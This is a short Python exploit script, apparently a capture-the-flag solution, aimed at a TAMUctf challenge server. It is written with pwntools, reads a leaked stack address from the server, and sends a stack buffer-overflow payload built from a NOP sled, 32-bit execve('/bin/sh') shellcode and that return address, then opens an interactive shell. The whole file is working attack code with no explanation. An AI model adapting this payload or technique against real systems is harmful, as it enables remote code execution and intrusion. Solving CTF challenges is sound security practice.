from pwn import *
import re

def gen_shellcode(ret_address):
   
    ## Shellcode to spawn a shell
    shellcode = b""
    shellcode += b"\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46"
    shellcode += b"\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
    shellcode += b"\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

    BUFFER_LEN = 302 
    NOP = b"\x90"

    shellcode_length = len(shellcode)

    output = b""
    for i in range(BUFFER_LEN - shellcode_length):
        output += NOP

    output += shellcode
    output += ret_address
    
    return output

r = remote("pwn.tamuctf.com", 4323)

r.recvuntil("journey ")

# Reads the address from the stream
address = (r.read()[:10]).decode("utf-8")
return_adress = p32(int(address, 16))

payload = gen_shellcode(return_adress)

r.sendline(payload)

# Gets our flag
r.interactive()
r.close()
